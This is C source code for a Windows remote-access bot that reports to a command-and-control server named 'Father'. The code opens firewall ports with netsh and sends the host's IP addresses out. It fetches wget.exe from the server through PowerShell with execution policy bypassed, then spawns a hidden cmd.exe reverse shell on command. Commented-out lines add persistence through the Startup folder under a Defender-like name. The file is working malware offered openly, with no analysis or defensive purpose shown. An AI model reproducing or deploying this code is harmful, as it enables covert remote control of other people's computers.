//
// Created by M on 2/5/2019.
//



// www requirements:
// A copy of wget.exe must be at /wget.exe -> Becasue getWget gets wget.exe from Father_IP/wget.exe
//


#include <winsock2.h>
#include <stdio.h>
#include <time.h>
#include "bot_auth.h"
#pragma comment(lib, "w2_32")
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;


////////////// C2 Server - Change this:
//#define Father_IP "ritrit.ddns.net"
#define Father_IP "10.1.1.1"


#define Whoami "Windows V 22"
#define MAX_LENGTH 4096 //max number of bytes in a message
#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
#define bcopy(b1,b2,len) (memmove((b2), (b1), (len)), (void) 0)
#define BUFSIZE 4096
#define PING_PORT 6066
#define SHELLPORT 6061

void connect2Father(){
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    struct hostent *host;
    host = gethostbyname(Father_IP);
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(SHELLPORT);
    hax.sin_addr.s_addr =inet_addr(ip_addr);
    WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    //CREATE_NO_WINDOW
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);
//    char *myArray[4] = { "cm", "d.e", "x", "e" };
//    char command[8] = "";
//    snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
//    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

//    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
//
//    memset(&ini_processo, 0, sizeof(ini_processo));
//    ini_processo.cb = sizeof(ini_processo);
//    ini_processo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
//    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE) Winsock;
//
//    //TCHAR commandLine[256] = L"cmd.exe";
//    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);


}

int setup(SOCKET *Father_p){
    WSADATA wsd;
    char Buffer[BUFSIZE];
    int ret,n;
    struct sockaddr_in server;
    unsigned short port;
    struct hostent *host = NULL;
    START_EVERYTHING:
    /*Load Winsock DLL*/
    if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        printf("Winsock    initialization failed!\n");
        return 0;
    }
    /*Create Socket*/
    *Father_p = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*Father_p == INVALID_SOCKET) {
        printf("socket() : %d\n", WSAGetLastError());
        return 0;
    }
    /*Specify the server address*/
    server.sin_family = AF_INET;
    port = PING_PORT;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(Father_IP);
    if (server.sin_addr.s_addr == INADDR_NONE) {
        host = gethostbyname(Father_IP);    /// Enter the address man name, etc.)
        if (host == NULL) {
            printf("Unable to resolve server address: %s\n", Father_IP);
            return 0;
        }
        CopyMemory(&server.sin_addr,
                   host->h_addr_list[0],
                   host->h_length);
    }
    /* Establish a connection with the server */
    printf("Establishing a connection with the server\n");
    START_CONNECTING:
    if (connect(*Father_p, (struct sockaddr*)&server,
                sizeof(server)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        if (error == 10061) {
            goto START_CONNECTING;
        } else {
            printf("connect() failure: %d\n", WSAGetLastError());
        }
    }
    return 1;
}

//todo add error checking functionality.
char* w8(const SOCKET *Father_p,char *buffer){
    // n is for errors
    int n= 0;
    //Get the length of the next command
    n = recv(*Father_p, buffer, MAX_LENGTH+1,0);
    if ((n) == -1){
        fprintf(stderr, "recv: %s (%d)\n", strerror(errno), errno);
        //clean buffer as an indication of a problem
        memset(buffer, 0, MAX_LENGTH);
        return buffer;
    }
    printf("%s\n",buffer);
    return buffer;
}

// TO get wget.exe, if this bin is not in the right place ($env:temp) many script will not work so
// Make sure that you check it has been downloaded.
void GetWget(char *Command){
    // Download wget
    // Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://google.com/index.html'; $file = '1.ps1'; $down.DownloadFile($url,$file);
    Command = strcat(Command,"Powershell -ExecutionPolicy ByPass $down = New-Object System.Net.WebClient; $url = 'http://");
    Command = strcat(Command,Father_IP);
    Command = strcat(Command,"/wget.exe'; $file = $env:temp+'\\wget.exe'; $down.DownloadFile($url,$file);\0");
    // Now we have wget.exe ready to use :)
    system(Command);
    memset(Command, 0, MAX_LENGTH);
}

//void copyymyself(){
//    'powershell -ExecutionPolicy ByPass cp .\\WinDef.exe \'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\''
//}



int send_buffer(const SOCKET *Father_p,char *buffer_to_send){
    int ret;
    ret = send(*Father_p,buffer_to_send , strlen(buffer_to_send), 0);
    //free(buffer_to_send);
    if (ret == 0) {
        //did not send anything
        return 1;
    }
    else if (ret == SOCKET_ERROR) {
        printf("send() failure: %d\n", WSAGetLastError());
        return -1;
    }
    return 0;
}


int main(int argc, char *argv[]){
    // Add a firewall rule - 80 if you wish
    system("netsh advfirewall firewall add rule name=\"Nemo\" dir=in action=allow protocol=TCP localport=6066");
    system("netsh advfirewall firewall add rule name=\"Nemo\" dir=in action=allow protocol=TCP localport=6061");
    system("netsh advfirewall firewall add rule name=\"Nemo\" dir=out action=allow protocol=TCP localport=6066");
    system("netsh advfirewall firewall add rule name=\"Nemo\" dir=out action=allow protocol=TCP localport=6061");

    char *Command;
    Command = calloc(MAX_LENGTH, sizeof(char));
    memset(Command, 0, MAX_LENGTH);
    //TheBoom(Command);
    free(Command);

    // If the first time
    //system("powershell if (!(Test-Path c:\\POCNemo.txt )){ powershell –ExecutionPolicy Bypass -File %tmp%\\DP.ps1");

    //system("echo 'Nemo' > C:\\POCNemo.txt");

        //connect2Father();
        // Setup the connection.
        SOCKET Father;
        Father = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        setup(&Father);

        // Send back all the IPs
        char *IP;
        IP = calloc(MAX_LENGTH, sizeof(char));
        memset(IP, 0, MAX_LENGTH);
        IP = getmyip(IP);
        printf("%s", IP);
        send_buffer(&Father, IP);
        free(IP);

        //Command is for the Father's/server's instructions
        //char *Command;
        Command = calloc(MAX_LENGTH, sizeof(char));
        memset(Command, 0, MAX_LENGTH);
        // Download wget
        GetWget(Command);

        //TheBoom(Command);
        //runall(Command);

        while (1) {
            Command = w8(&Father, (char *) Command);
            char c = Command[0];
            printf("%s\n", Command);
            printf("%c is equal to 1 ??", c);
            if (c == '1') {
                printf("Connected");
                //
                //
                connect2Father();
            } else {
                printf("Disconnected");
                free(Command);
                break;
                //exit(0);
            }
            memset(Command, 0, MAX_LENGTH);
        }
        closesocket(Father);

        // 1 Min
        //Sleep(60);
    }
